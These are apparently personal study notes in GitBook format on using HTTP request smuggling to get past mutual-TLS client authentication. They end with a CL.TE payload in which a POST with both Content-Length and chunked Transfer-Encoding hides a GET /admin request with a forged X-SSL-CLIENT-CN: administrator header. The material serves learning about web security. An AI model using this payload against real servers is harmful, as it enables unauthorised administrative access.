---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Bypassing client authentication

TLS handshake requires server to authenticate themselves to clients, usually client verifiying the Common Name(CN) which should match the domain hostname.

Some sites go one step furthur in using M(mutual)TLS where server verifies identify of the client via a certificate presented to the server containing its CN, usually like a username. The front end server usually append a non standard http header for this.

`GET /admin`\
`HTTP/1.1` \
`Host: normal-website.com` \
<mark style="color:blue;">`X-SSL-CLIENT-CN: carlos`</mark>

This behaviour is not that exploitable in practice as front end server usually overwrite them if they exist already. However, smuggled requests are hidden from the front end and backend server can process them with headers unchanged.

`POST /example HTTP/1.1` \
`Host: vulnerable-website.com` \
`Content-Type: x-www-form-urlencoded` \
`Content-Length: 64` \
`Transfer-Encoding: chunked`

`0`

`GET /admin HTTP/1.1` \
`X-SSL-CLIENT-CN: administrator` \
`Foo: x`
